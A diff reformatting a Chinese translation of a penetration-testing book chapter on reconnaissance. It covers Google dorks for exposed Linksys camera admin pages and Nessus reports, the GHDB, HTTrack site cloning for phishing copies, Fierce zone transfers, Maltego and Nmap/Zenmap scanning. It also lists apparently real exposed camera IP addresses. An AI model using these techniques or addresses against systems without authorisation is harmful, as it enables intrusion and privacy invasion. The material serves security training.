-| 城市 | | |
+
+
+# 第 2 章
+
+| 名称 | 数量 | 响应 |
 | :--- | :--- | :--- |
 | 加加 | 11 | NetBIOS Response |
 | 休斯顿 | 5 | Servername: SCADA <0x0> |
@@ -889,9 +867,7 @@ Shodan 是一种搜索引擎，可以识别特定的设备，如计算机、路�
 | 本溪 | 5 | SCADA <0x1> |
 | 斯德哥尔摩 | 5 | WORKGROUP <0x1> |
 | | | WORKGROUP <0x1> |
-
 | 组织 | | |
-| :--- | :--- | :--- |
 | Telus Communications | 13 | 401 Authorization |
 | Nucleus Information... | 6 | 142.59.128.96 |
 | Telefonica de Espana | 5 | Windows XP |
@@ -900,36 +876,41 @@ Shodan 是一种搜索引擎，可以识别特定的设备，如计算机、路�
 | 加加 | | d010-137-225.abhsla.telia.com |
 | | | HTTP/1.0 401 Authorization |
 
-### Google hacking
+## Google hacking
 
-Google hacking 是最常见的搜索引擎侦察形式。Google hacking 使用 Google 搜索高级操作在结果中定位特定的字符串。搜索过滤器可以锁定特定版本的应用程序，或者通过 `entitle:"index of"` 操作识别包含敏感  日志文件。以下截图演示了使用 Google 搜索查找可用的 Linksys 摄像头。第一张显示了执行命令后的示例结果。最后一张截图显示了使用此技术可以找到摄像头[](img/df1fdcde66c92c1fef83bd651dd5ffe3_61_0.png)
+Google hacking 是最常见的搜索引擎侦察形式。Google hacking 使用 Google 搜索高级操作在结果中定位特定的字符串。搜索过滤器可以锁定特定版本的应用程序，或者通过 `entitle:"index of"` 操作识别包含敏感日志文件。以下截图演示了使用 Google 搜索查找可用的 Linksys 摄像头。第一张显示了执行命令后的示例结果。最后一张截图显示了使用此技术可以找到摄像头。
 
-| Linksys Wireless-G Internet Video Camera | | | |
-| :--- | :--- | :--- |
-| 92.71.245.81:1027/main.cgi?next_file=index.htm | Linksys Ver. 2.12, Home | Video | Setup | Linksys Web | Help | Exit |
-| Linksys Wireless-G PTZ Internet Camera with Audio | mam-camera.dns.alias.net/main.cgi?next_file=index.htm | WWC200. Wireless-G PTZ Internet Camera with Audio, Home| View Video| Setup| Linksys Web Exit. Connected User: 0. | Copyright 2007 Cisco ... |
-| Linksys Web Camera | 177.142.46.3:1028/main.cgi?next_file=index.htm | Linksys Ver. 2.13, Home | Video View | Setup | Linksys Web | Help | Exit |
-| Linksys Wireless-G Internet Video Camera | 72.250.149.1024/main.cgi?next_file=index.htm | Linksys Ver. 2.11, Home | Video | Setup | Linksys Web | Help | Exit | You visited this page 3 times. Last visit: 3/19/13 |
-| Linksys Wireless-G PTZ Internet Camera with Audio | 213.67.110.1024/main.cgi?next_file=main.htm | WWC200. Wireless-G PTZ Internet Camera with Audio, Home| View Video, Setup, | Linksys Web, Exit. Image Resolution, 640*480, 320*240, ... |
-| Linksys Wireless-G PTZ Internet Camera with Audio | 66.11.106.28:8181/main.cgi?next_file=main.htm | WWC200. Wireless-G PTZ Internet Camera with Audio, Home| View Video| Setup
-Linksys Webt. Image Resolution, 640*480, 320*240, Northwest ...nYou visited this page 3 times. Last visit: 3/19/13 |
+![](img/df1fdcde66c92c1fef83bd651dd5ffe3_61_0.png)
 
+- Linksys Wireless-G Internet Video Camera
+  - URL：`92.71.245.81:1027/main.cgi?next_file=index.htm`
+  - 描述：Linksys Ver. 2.12, Home | Video | Setup | Linksys Web | Help | Exit
+- Linksys Wireless-G PTZ Internet Camera with Audio
+  - URL：`mam-camera.dns.alias.net/main.cgi?next_file=index.htm`
+  - 描述：WWC200. Wireless-G PTZ Internet Camera with Audio, Home| View Video| Setup| Linksys Web Exit. Connected User: 0. | Copyright 2007 Cisco ...
+- Linksys Web Camera
+  - URL：`177.142.46.3:1028/main.cgi?next_file=index.htm`
+  - 描述：Linksys Ver. 2.13, Home | Video View | Setup | Linksys Web | Help | Exit
+- Linksys Wireless-G Internet Video Camera
+  - URL：`72.250.149.1024/main.cgi?next_file=index.htm`
+  - 描述：Linksys Ver. 2.11, Home | Video | Setup | Linksys Web | Help | Exit | You visited this page 3 times. Last visit: 3/19/13
+- Linksys Wireless-G PTZ Internet Camera with Audio
+  - URL：`213.67.110.1024/main.cgi?next_file=main.htm`
+  - 描述：WWC200. Wireless-G PTZ Internet Camera with Audio, Home| View Video, Setup, | Linksys Web, Exit. Image Resolution, 640*480, 320*240, ...
+- Linksys Wireless-G PTZ Internet Camera with Audio
+  - URL：`66.11.106.28:8181/main.cgi?next_file=main.htm`
+  - 描述：WWC200. Wireless-G PTZ Internet Camera with Audio, Home| View Video| Setup Linksys Webt. Image Resolution, 640*480, 320*240, Northwest ... You visited this page 3 times. Last visit: 3/19/13
 
-
-
-
-## 第 2 章
-
-| LINKSYS Cisco Systems, Inc. 分部 | | WCS80N |
-| 无线-N 家庭监控摄像头 | 首页 | 观看视频 | 设置 | Linksys 网页 | 帮助 | 退出 |
+- LINKSYS Cisco Systems, Inc. 分部 | WCS80N
+- 无线-N 家庭监控摄像头 | 首页 | 观看视频 | 设置 | Linksys 网页 | 帮助 | 退出
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_62_0.png)
 
 以下是一些示例查询语句：
 
-- 识别敏感文档：intext: classified top secret
-- 识别 Linksys 摄像头管理 GUI（注意：你可能不会喜欢你发现的内容）：inurl:main.cgi
-- 识别 Nessus 报告以寻找漏洞系统：inurl:NESSUSXXXXXXX
+- 识别敏感文档：`intext: classified top secret`
+- 识别 Linksys 摄像头管理 GUI（注意：你可能不会喜欢你发现的内容）：`inurl:main.cgi`
+- 识别 Nessus 报告以寻找漏洞系统：`inurl:NESSUSXXXXXXX`
 
 关于 Google 黑客攻击（Google hacking）的更多信息，请查看由 Johnny Long 编写的一本非常好的书《渗透测试者的攻击指南》（Hacking for Penetration Testers），以及他的网站 http://johnny.ihackstuff.com。
 
@@ -938,6 +919,7 @@ Linksys Webt. Image Resolution, 640*480, 320*240, Northwest ...nYou visited this
 Google 黑客攻击数据库（GHDB）由 Hackers For Charity（http://www.hackersforcharity.org/）的 Johnny Long 创建，是查询语句的权威来源。针对用户名、密码、漏洞系统和利用程序的搜索已被黑客爱好者捕获并分类。这些对 Google 搜索进行分类的爱好者被形象地称为 Google dorks（Google 狗术）。
 
 要访问 GHDB，请访问 http://www.exploit-db.com/google-dorks/
+
 你将在网页上看到列出的最新 GHDB 查询。你可以自己点击任何一个查询语句。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_63_0.png)
@@ -946,17 +928,11 @@ Google 黑客攻击数据库（GHDB）由 Hackers For Charity（http://www.hacke
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_63_1.png)
 
-[ 46 ]
-
-## 第 2 章
-
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_64_0.png)
 
 我们可以选择查询语句，它将带我们进入 Google 并执行相同的查询语句。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_64_1.png)
-
-[ 47 ]
 
 ### 侦察
 
@@ -970,20 +946,19 @@ GHDB 本质上将 Google 变成了渗透测试者的有限 Web 应用程序扫�
 
 ## 网络研究
 
-许多人并不理解目标网络以发动攻击的真实目的。业余渗透测试者理解在执行渗透测试之前需要选择一个目标。毕竟，渗透测试者需要一个地方来部署他们的工具库。这些业余人员会运行 Nmap、ping 扫描或其他嘈杂的工具来确定哪些目标可用，从而干扰环境，这随后会导致产生糟糕的结果。
+许多人并不理解目标网络以发动攻击的真实目的。业余渗透测试者理解在执行渗透测试之前需要选择一个目标。毕竟，渗透测试者需要一个地方来部署他们的工具库。这些业余人员会运行 `Nmap`、`ping` 扫描或其他嘈杂的工具来确定哪些目标可用，从而干扰环境，这随后会导致产生糟糕的结果。
 
 网络侦察的核心在于选择目标。经验丰富的网络安全专业人士会告诉你，良好的侦察在于选择一个高质量的目标，并将大部分时间花在观察而不是行动。每次渗透测试的第一步都是准确地找到并选择高质量的目标。
+
+
 
 从客户的角度来看，渗透测试者会遇到一些通过阻止渗透测试者来获得满足的人，以此证明他们作为员工的价值以及他们对网络攻击的准备工作。强烈建议专业的渗透测试者在执行渗透服务期间不要与客户员工发生冲突。渗透测试者应该关注安全意识，并在与目标员工交互最少的情况下揭示存在的漏洞。
 
 以下是 Kali 中适用于 Web 应用程序侦察的最佳可用工具。其他其他适用于 Web 应用程序或其他类型的工具，但本章的重点是让读者能够评估基于 Web 应用程序的目标。
 
-### HTTrack – 克隆网站
+## HTTrack – 克隆网站
 
 HTTrack 是 Kali 内置的一个工具。HTTrack 的作用是复制网站。它允许渗透测试者离线并在他们自己的受控环境中查看网站的所有内容及其所有页面。此外，我们将在后面的章节中使用 HTTrack 进行社交工程学攻击。拥有网站副本可以用于开发虚假的网络钓鱼网站，这可以被纳入渗透测试中。
-
-
-
 
 在你克隆网站后，导航到保存该内容的目录。在其中，你将找到所有的文件和网页，如下截图所示：
 
@@ -996,7 +971,7 @@ root@kali:~/mywebsites#
 
 你现在已经准备好对目标网站进行研究，并可能构建自定义渗透工具或获取对封闭网站的权限。
 
-### ICMP 侦察技术
+## ICMP 侦察技术
 
 `ping` 和 `traceroute` 命令是获取目标基本信息的良好方法。当信息跨网络传输时，通常会在到达目的地之前经过几个系统，例如路由器、防火墙和其他计算机系统。`traceroute` 命令可以识别数据传输的每个系统，以及数据在系统之间移动所需的时间。每个现代操作系统都安装了该工具。对于大多数高价值目标，`ping` 和 `traceroute` 命令可能会被禁用，过度使用这些服务很可能会触发网络安全系统的警报。许多防火墙或其他系统被设置为不响应二进制路由。如果系统对 `traceroute` 有响应，过度使用它可能会触发安全事件。这些工具具有噪声性，如果不加区分地使用，将触发报警和日志。如果你的目标是隐蔽，那么你刚刚失败了，给了你的目标一个针对你的渗透测试建立和部署防御措施的机会。
 
@@ -1032,9 +1007,9 @@ fping -asg 10.0.1.0/24
 
 虽然标记将仅通过活跃主机的 IP 地址返回结果，但 `s` 标志显示扫描的统计信息，`g` 标志将 `fping` 设置为静默模式，这意味着它向用户显示每次扫描的状态，仅在完成后显示摘要。
 
-> Nmap 提供与 `fping` 命令类似的结果。
+> `Nmap` 提供与 `fping` 命令类似的结果。
 
-### DNS 侦察技术
+## DNS 侦察技术
 
 大多数高价值目标都有与关联的 DNS 名称。DNS 让用户更容易访问特定服务，并为他们的系统增添了专业性。例如，如果你想访问 Google 获取信息，可以打开浏览器并输入 `74.125.227.101` 或输入 `www.google.com`。
 
@@ -1044,7 +1019,7 @@ fping -asg 10.0.1.0/24
 
 ![](img/df1fede66c92fe83_71.png)
 
-`-t` 选项会让 `dig` 向权威服务器授权区域。我们在对 `www.cloudcentrics.com` 执行 **`dig -t ns.cloudcentrics.com`** 时输入：
+`-t` 选项会让 `dig` 向权威服务器授权区域。我们在对 `www.cloudcentrics.com` 执行 `dig -t ns.cloudcentrics.com` 时输入：
 
 ```
 alakhani — bash —80
@@ -1080,11 +1055,15 @@ cloudcentrics.com.	IN	NS	3600	ns3682.gator.com.
 
 Kali 自带名为 `Fierce` 的工具。`Fierce` 会检查 DNS 服务器是否允许区域传输。如果允许区域传输，`Fierce` 将执行区域传输并告知用户条目。如果 DNS 服务器不允许区域传输，`Fierce` 可以配置为对 DNS 服务器进行主机名破解。要要使用 `Fierce`，导航到信息收集 | DNS 分析 | Fierce。`Fierce` 提供以下选项：
 
---threads 指定扫描时使用的线程数（d 为单线程）
---traverse 指定在发现的 IP 上下方的 IP 数量。默认是下方 5 个。遍历不会移动到其他 C 块。
---version 输出版本号。
---wide 在发现该类中的任何主机名后，扫描整个 C 类。这会产生更多内容，但可以发现更多信息。
---wordlist 使用单独的字典（每行一个单词）
+- `--threads` 指定扫描时使用的线程数（d 为单线程）
+- `--traverse` 指定在发现的 IP 上下方的 IP 数量。默认是下方 5 个。遍历不会移动到其他 C 块。
+- `--version` 输出版本号。
+
+
+
+`--wide`在发现该类中的任何主机名后，扫描整个 C 类。这会产生更多内容，但可以发现更多信息。
+
+`--wordlist`使用单独的字典（每行一个单词）
 
 运行 `Fierce` 脚本，输入以下命令：
 
@@ -1092,36 +1071,33 @@ Kali 自带名为 `Fierce` 的工具。`Fierce` 会检查 DNS 服务器是否允
 fierce.pl -dns examplecompany.com -wordlist dictionary
 ```
 
-
-
-
 ## 第 2 章
 
-如前面的截图所示，域名 securityblogger.com 及其与其关联的几个主机。我们已经完成了任务。然而，你可以看到 Fierce 未能完成区域传输（zone transfer）。如果你定义了词汇列表或字典文件，Fierce 将尝试使用它们对区域进行暴力破解。我们没有定义，因为本节的目标是确定该域名上存在哪些主机，而不一定非要在此时此执行区域传输攻击。但是，如果你的目标比针对 Web 应用程序更广泛，你可能想自己自己进一步探索。
+如前面的截图所示，域名 `securityblogger.com` 及其与其关联的几个主机。我们已经完成了任务。然而，你可以看到 `Fierce` 未能完成区域传输（zone transfer）。如果你定义了词汇列表或字典文件，`Fierce` 将尝试使用它们对区域进行暴力破解。我们没有定义，因为本节的目标是确定该域名上存在哪些主机，而不一定非要在此时此执行区域传输攻击。但是，如果你的目标比针对 Web 应用程序更广泛，你可能想自己自己进一步探索。
 
-我们现在可以检测特定的主机，并使用 Nmap 等工具进一步对我们的目标进行映射。使用 Fierce 的一个重要方面是使用极少的网络流量选择目标，这对于避免被检测至关重要。我们将在本章后面使用 Nmap 收集有关我们目标的更多信息。
+我们现在可以检测特定的主机，并使用 `Nmap` 等工具进一步对我们的目标进行映射。使用 `Fierce` 的一个重要方面是使用极少的网络流量选择目标，这对于避免被检测至关重要。我们将在本章后面使用 `Nmap` 收集有关我们目标的更多信息。
 
-## Maltego – 信息收集图谱
+### Maltego – 信息收集图谱
 
-Maltego 是由 Patwian 开发的内置在 Kali 中的一种侦察工具。它是一个多功能侦察工具，可以使用互联网上的开放和公开信息收集信息。它内置了侦察功能，但更深入地对你的目标进行指纹识别并收集情报。它获取信息并将结果以图的形式显示以便分析。
+`Maltego` 是由 `Patwian` 开发的内置在 `Kali` 中的一种侦察工具。它是一个多功能侦察工具，可以使用互联网上的开放和公开信息收集信息。它内置了侦察功能，但更深入地对你的目标进行指纹识别并收集情报。它获取信息并将结果以图的形式显示以便分析。
 
-要启动 Maltego，导航到 Kali 中的“应用程序 (Application)”，点击 Kali 菜单。然后选择“信息收集 (Information Gathering) | DNS 分析 (DNS Analysis) | Maltego”。
+要启动 `Maltego`，导航到 `Kali` 中的“应用程序 (Application)”，点击 `Kali` 菜单。然后选择“信息收集 (Information Gathering) | DNS 分析 (DNS Analysis) | Maltego”。
 
-启动 Maltego 的第一步是注册。不注册就无法使用该应用程序。
+启动 `Maltego` 的第一步是注册。不注册就无法使用该应用程序。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_74_0.png)
 
 [ 57 ]
 
-### 侦察
+#### 侦察
 
-完成注册后，你就可以安装 Maltego 并开始使用应用程序。
+完成注册后，你就可以安装 `Maltego` 并开始使用应用程序。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_75_0.png)
 
-Maltego 有许多收集信息的方法。使用 Maltego 的方法是利用启动向导选择你想收集的信息类型。经验用户可能想从空白图谱开始，或者完全跳过向导。Maltego 的强大之处在于它可以让你直观地观察域名、组织和人之间的关系。你可以围绕特定的组织关注，或者通过 DNS 查询查看组织及其相关的伙伴关系。
+`Maltego` 有许多收集信息的方法。使用 `Maltego` 的方法是利用启动向导选择你想收集的信息类型。经验用户可能想从空白图谱开始，或者完全跳过向导。`Maltego` 的强大之处在于它可以让你直观地观察域名、组织和人之间的关系。你可以围绕特定的组织关注，或者通过 DNS 查询查看组织及其相关的伙伴关系。
 
-根据所选择的扫描选项，Maltego 将允许你执行以下任务：
+根据所选择的扫描选项，`Maltego` 将允许你执行以下任务：
 
 - 将电子邮箱地址关联到个人
 - 将网站关联到个人
@@ -1132,21 +1108,21 @@ Maltego 有许多收集信息的方法。使用 Maltego 的方法是利用启动
 
 ## 第 2 章
 
-大多数功能都是自显易懂的，并在功能描述下包含了它们的使用方法。Maltego 常用于收集信息，有时用作社会工程攻击的第一步。
+大多数功能都是自显易懂的，并在功能描述下包含了它们的使用方法。`Maltego` 常用于收集信息，有时用作社会工程攻击的第一步。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_76_0.png)
 
-## Nmap
+### Nmap
 
-Nmap 代表 Network Mapper（网络制映射器），用于扫描网络上的主机和服务。Nmap 具有高级功能，可以检测系统上运行的不同应用程序，以及服务和操作系统的指纹识别功能。它是使用最广泛的网络扫描器之一，使其非常有效，但也非常容易被检测。我们建议在非常特定的情况下使用 Nmap，以避免触发目标的防御系统。
+`Nmap` 代表 Network Mapper（网络制映射器），用于扫描网络上的主机和服务。`Nmap` 具有高级功能，可以检测系统上运行的不同应用程序，以及服务和操作系统的指纹识别功能。它是使用最广泛的网络扫描器之一，使其非常有效，但也非常容易被检测。我们建议在非常特定的情况下使用 `Nmap`，以避免触发目标的防御系统。
 
-有关如何使用 Nmap 的更多信息，请访问：http://nmap.org/
+有关如何使用 `Nmap` 的更多信息，请访问：http://nmap.org/
 
-此外，Kali 还带了 Zenmap。Zenmap 为 Nmap 提供了一个图形化用户界面 (GUI) 来运行命令。虽然有很多纯主义者会告诉你命令行版本在速度和灵活性上是最好的版本，但 Zenmap 已经取得了很大进步，并整合了 Nmap 的大部分功能。Zenmap 还提供了 Nmap 不提供的独有功能，例如开发扫描的图形表示，这些以后可以被其他报告系统使用。
+此外，`Kali` 还带了 `Zenmap`。`Zenmap` 为 `Nmap` 提供了一个图形化用户界面 (GUI) 来运行命令。虽然有很多纯主义者会告诉你命令行版本在速度和灵活性上是最好的版本，但 `Zenmap` 已经取得了很大进步，并整合了 `Nmap` 的大部分功能。`Zenmap` 还提供了 `Nmap` 不提供的独有功能，例如开发扫描的图形表示，这些以后可以被其他报告系统使用。
 
-复兴 (Renaissance)
+#### 复兴 (Renaissance)
 
-要打开 Zenmap，进入 Backtrack 菜单。导航到“信息映射 (Information Mapping) | DNS 分析 (DNS Analysis)”，并启动 Zenmap。
+要打开 `Zenmap`，进入 Backtrack 菜单。导航到“信息映射 (Information Mapping) | DNS 分析 (DNS Analysis)”，并启动 `Zenmap`。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_77_0.png)
 
@@ -1158,19 +1134,19 @@ Nmap 代表 Network Mapper（网络制映射器），用于扫描网络上的主
 
 ## 第 2 章
 
-第一步是创建一个新配置。Zenmap 中的配置允许渗透测试人员选择执行什么种类型的扫描以及包含哪些不同选项。导航到“配置 (Profile)”菜单并选择“新配置 (New Profile)”或“命令 (Command)”来创建一个新配置，如下截图所示：
+第一步是创建一个新配置。`Zenmap` 中的配置允许渗透测试人员选择执行什么种类型的扫描以及包含哪些不同选项。导航到“配置 (Profile)”菜单并选择“新配置 (New Profile)”或“命令 (Command)”来创建一个新配置，如下截图所示：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_78_0.png)
 
-当你选择“新配置”或“命令”时，配置编辑器将启动。你需要给它一个描述性的名称。例如，你可以将配置命名为 My Scan（我的扫描）或你喜欢的任何名称。
+当你选择“新配置”或“命令”时，配置编辑器将启动。你需要给它一个描述性的名称。例如，你可以将配置命名为 `My Scan`（我的扫描）或你喜欢的任何名称。
 
-可选情况下，你可以提供配置描述。在使用 Zenmap 的过程中，你可能会创建许多配置并进行多次扫描。一种本能可能是执行后删除配置。这里有一个建议：配置不占用任何空间，并且在你想要重新创建某些内容时会非常有用。我们建议在配置名称中使用极具描述性的词汇，并制定一种标准的命名方法。我所有的配置描述都以日期、时间、位置描述、目标网络扫描位置和客户名称开始。
+可选情况下，你可以提供配置描述。在使用 `Zenmap` 的过程中，你可能会创建许多配置并进行多次扫描。一种本能可能是执行后删除配置。这里有一个建议：配置不占用任何空间，并且在你想要重新创建某些内容时会非常有用。我们建议在配置名称中使用极具描述性的词汇，并制定一种标准的命名方法。我所有的配置描述都以日期、时间、位置描述、目标网络扫描位置和客户名称开始。
 
 img/df1fdcde66c92c1fef83bd651dd5ffe3_78.png
 
-完成描述后，点击“扫描 (Scan)”选项卡。在“目标 (Targets)”字段中，你可以指定想要扫描的主机或网络。这可以是单个 IP 地址、主机范围或 CIDR 格式（例如 192.168.1.0/24）。
+完成描述后，点击“扫描 (Scan)”选项卡。在“目标 (Targets)”字段中，你可以指定想要扫描的主机或网络。这可以是单个 IP 地址、主机范围或 CIDR 格式（例如 `192.168.1.0/24`）。
 
-你可以指定扫描选项。Zenmap 允许你执行以下任务：
+你可以指定扫描选项。`Zenmap` 允许你执行以下任务：
 
 - 扫描主机或网络
 - 扫描端口
@@ -1178,56 +1154,86 @@ img/df1fdcde66c92c1fef83bd651dd5ffe3_78.png
 - 扫描脚本
 
 选择 `-A` 选项将启用所有高级扫描，包括：
-- 操作系统检测 (-O)
-- 版本检测 (-sV)
-- 脚本扫描 (-sC)
-- 快速跟踪 (-traceroute)
-- 空闲扫描 (-sI)
-- FTP 攻击 (-b)
-- 禁用 DNS 解析 (-n)
-- IPv6 支持 (-6)
-- ACK 探测 (-PA)
-- SYN 探测 (-PS)
-- UDP 探测 (-PU)
-- IP 协议探测 (-PO)
-- SCTP INIT 探测 (-PY)
+
+- 操作系统检测 (`-O`)
+- 版本检测 (`-sV`)
+- 脚本扫描 (`-sC`)
+- 快速跟踪 (`-traceroute`)
+- 空闲扫描 (`-sI`)
+- FTP 攻击 (`-b`)
+- 禁用 DNS 解析 (`-n`)
+- IPv6 支持 (`-6`)
+- ACK 探测 (`-PA`)
+- SYN 探测 (`-PS`)
+- UDP 探测 (`-PU`)
+- IP 协议探测 (`-PO`)
+- SCTP INIT 探测 (`-PY`)
 
 默认情况下，`-A` 选项会启用扫描：
-- ICMP Ping 探测 (-PE)
-- ICMP  {戳请求 (-PP)
-- ICMP 子网掩码请求 (-MP)
 
-在不设置此标志时，Nmap 将 ping 目标主机和网络。由于安全设备拦截请求，这可能会变得非常缓慢。`-Pn` 标志允许 Nmap 即使在没有 ping 的情况下也扫描主机。激进扫描被认为是侵入性的，会被大多数系统检测到。在不设置此标志时，Nmap 将只对存活或可达的主机进行扫描。`-Pn` 标志允许 Nmap 即使在没有 ping 的情况下也扫描主机。由于安全设备拦截请求，这可能会变得非常缓慢。
+- ICMP Ping 探测 (`-PE`)
+- ICMP {戳请求 (`-PP`)
+- ICMP 子网掩码请求 (`-MP`)
 
+在不设置此标志时，`Nmap` 将 ping 目标主机和网络。由于安全设备拦截请求，这可能会变得非常缓慢。`-Pn` 标志允许 `Nmap` 即使在没有 ping 的情况下也扫描主机。激进扫描被认为是侵入性的，会被大多数系统检测到。在不设置此标志时，`Nmap` 将只对存活或可达的主机进行扫描。`-Pn` 标志允许 `Nmap` 即使在没有 ping 的情况下也扫描主机。由于安全设备拦截请求，这可能会变得非常缓慢。
 
+#### 侦察
 
-
-
-### 侦察
-
-Hosts（主机）将列出发现的主机列表。
+`Hosts`（主机）将列出发现的主机列表。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_81_0.png)
 
-选择一个主机后，Zenmap 将显示主机的详细列表、其操作系统以及常用服务。在下面的截图中，你可以看到我们的一个主机是一个卫星 DVR/接收机一体机。
+选择一个主机后，`Zenmap` 将显示主机的详细列表、其操作系统以及常用服务。在下面的截图中，你可以看到我们的一个主机是一个卫星 DVR/接收机一体机。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_81_1.png)
 
 ## 第二章
 
-如果你查看 scan（扫描）内部，你将看到特定主机上开启了哪些端口，以及这些主机上运行了哪些应用程序。注意，Nmap 可以确定某些信息，例如服务器是否正在通过端口 80 运行 IIS 5.0 作为 Web 服务器。扫描结果将产生服务器的 IP 地址、服务器运行的操作系统以及在其运行的应用程序。渗透测试人员在针对该主机的漏洞时，会发现这些结果非常有价值。
+如果你查看 `scan`（扫描）内部，你将看到特定主机上开启了哪些端口，以及这些主机上运行了哪些应用程序。注意，`Nmap` 可以确定某些信息，例如服务器是否正在通过端口 `80` 运行 `IIS 5.0` 作为 Web 服务器。扫描结果将产生服务器的 IP 地址、服务器运行的操作系统以及在其运行的应用程序。渗透测试人员在针对该主机的漏洞时，会发现这些结果非常有价值。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_82_0.png)
 
-现在你可以检查目标在端口 80 上运行的 Web 服务了，因为这非常重要。
+现在你可以检查目标在端口 `80` 上运行的 Web 服务了，因为这非常重要。
 
-Zenmap 获取 Nmap 扫描输出的最佳方式。Zenmap 提供了一个图形化界面来显示扫描结果，并可以导出为不同的格式，如文本或 xml。
+`Zenmap` 获取 `Nmap` 扫描输出的最佳方式。`Zenmap` 提供了一个图形化界面来显示扫描结果，并可以导出为不同的格式，如文本或 xml。
 
-虽然有很多方法获取 Nmap 输出（例如，本书的作者更倾向于命令行技术），但我们包含了这种技术，因为它在许多 Web 渗透标准中被引用，也是人们使用它的一种常用方法。
+虽然有很多方法获取 `Nmap` 输出（例如，本书的作者更倾向于命令行技术），但我们包含了这种技术，因为它在许多 Web 渗透标准中被引用，也是人们使用它的一种常用方法。
 
 | Nmap 输出 | 端口 / 主机 | 拓扑结构 | 主机详情 | 扫描 |
 |---|---|---|---|---|
-| nmap -T4 -A -v 10.0.1.0/24 | | | 详情 | 19:58 启动隐蔽扫描<br>正在扫描 5 个主机 [1000 端口/主机]<br>在 10.0.1.104 上发现端口 8888/tcp<br>在 10.0.1.107 上发现端口 8080/tcp<br>在 10.0.1.107 上发现端口 445/tcp<br>在 10.0.1.103 上发现端口 53/tcp<br>在 10.0.1.103 上发现端口 22/tcp<br>在 10.0.1.103 上发现端口 80/tcp<br>在 10.0.1.107 上发现端口 80/tcp<br>在 10.0.1.104 上发现端口 443/tcp<br>在 10.0.1.104 上发现端口 443/tcp<br>在 10.0.1.104 上发现端口 139/tcp<br>在 10.0.1.1 上发现端口 53/tcp<br>在 10.0.1.107 上发现端口 9100/tcp<br>在 10.0.1.107 上发现端口 531/tcp<br>在 10.0.1.107 上发现端口 9290/tcp<br>在 10.0.1.107 上发现端口 9111/tcp<br>在 10.0.1.107 上发现端口 6383/tcp<br>在 10.0.1.107 上发现端口 9110/tcp<br>在 10.0.1.107 上发现端口 9102/tcp<br>在 10.0.1.107 上发现端口 9290/tcp<br>在 10.0.1.107 上发现端口 515/tcp<br>在 10.0.1.107 上发现端口 9101/tcp<br>在 10.0.1.104 上发现端口 787/tcp<br>在 1.27s 内对 10.0.1.104 完成 SYN 隐蔽扫描（剩余 4 个主机）<br>在 1.27s 内对 10.0.1.104 完成 SYN 隐蔽扫描（剩余 5 个主机）<br>在 10.0.1.1 上发现端口 5009/tcp |
+
+
+
+`nmap -T4 -A -v 10.0.1.0/24`
+
+详情
+19:58 启动隐蔽扫描
+正在扫描 5 个主机 [1000 端口/主机]
+在 10.0.1.104 上发现端口 8888/tcp
+在 10.0.1.107 上发现端口 8080/tcp
+在 10.0.1.107 上发现端口 445/tcp
+在 10.0.1.103 上发现端口 53/tcp
+在 10.0.1.103 上发现端口 22/tcp
+在 10.0.1.103 上发现端口 80/tcp
+在 10.0.1.107 上发现端口 80/tcp
+在 10.0.1.104 上发现端口 443/tcp
+在 10.0.1.104 上发现端口 443/tcp
+在 10.0.1.104 上发现端口 139/tcp
+在 10.0.1.1 上发现端口 53/tcp
+在 10.0.1.107 上发现端口 9100/tcp
+在 10.0.1.107 上发现端口 531/tcp
+在 10.0.1.107 上发现端口 9290/tcp
+在 10.0.1.107 上发现端口 9111/tcp
+在 10.0.1.107 上发现端口 6383/tcp
+在 10.0.1.107 上发现端口 9110/tcp
+在 10.0.1.107 上发现端口 9102/tcp
+在 10.0.1.107 上发现端口 9290/tcp
+在 10.0.1.107 上发现端口 515/tcp
+在 10.0.1.107 上发现端口 9101/tcp
+在 10.0.1.104 上发现端口 787/tcp
+在 1.27s 内对 10.0.1.104 完成 SYN 隐蔽扫描（剩余 4 个主机）
+在 1.27s 内对 10.0.1.104 完成 SYN 隐蔽扫描（剩余 5 个主机）
+在 10.0.1.1 上发现端口 5009/tcp
 
 此外，Zenmap GUI 中的多处地方允许你将图形和报告的某些部分导出为 CSV 文件或图像文件。这些导出在创建报告时非常有价值。
 
@@ -1247,21 +1253,21 @@ Zenmap 获取 Nmap 扫描输出的最佳方式。Zenmap 提供了一个图形化
 - 创建文档的软件
 - 创建文档的操作系统
 
-FOCA 是一种安全审计工具，将检查来自域的元数据。你可以让 FOCA 使用搜索引擎查找网域上的文件，或使用本地文件。FOCA 内置于 Kali 中；但该版本已经过时。最佳实践是下载最新版本。FOCA 传统上是一个 Windows 工具，较新版本可能仅适用于 Windows。可以在此处地址下载 FOCA 的最新版本：http://www.internet.com/DownloadFOCA（使用 Google 查看该英文页面）。你需要在屏幕底部提供你的地址。你将收到一封带有下载链接的电子邮件。当 FOCA 有新版本发布时，你也会收到更新通知。
+`FOCA` 是一种安全审计工具，将检查来自域的元数据。你可以让 `FOCA` 使用搜索引擎查找网域上的文件，或使用本地文件。`FOCA` 内置于 Kali 中；但该版本已经过时。最佳实践是下载最新版本。`FOCA` 传统上是一个 Windows 工具，较新版本可能仅适用于 Windows。可以在此处地址下载 `FOCA` 的最新版本：http://www.internet.com/DownloadFOCA（使用 Google 查看该英文页面）。你需要在屏幕底部提供你的地址。你将收到一封带有下载链接的电子邮件。当 `FOCA` 有新版本发布时，你也会收到更新通知。
 
-1. 启动 FOCA 后要的第一件事是创建一个新项目，如下：![](img/df1fdcde66c92c1fef83bd651dd5ffe3_84_0.png)
+1. 启动 `FOCA` 后要的第一件事是创建一个新项目，如下：![](img/df1fdcde66c92c1fef83bd651dd5ffe3_84_0.png)
 
 我们建议将所有项目文件放在一个地方。你应该为每个项目创建一个新文件夹。
 
-2. 一旦命名了项目名称并决定了存储位置，请点击 **Create**（创建）按钮，如下：![](img/df1fdcde66c92c1fef83bd651dd5ffe3_85_0.png)
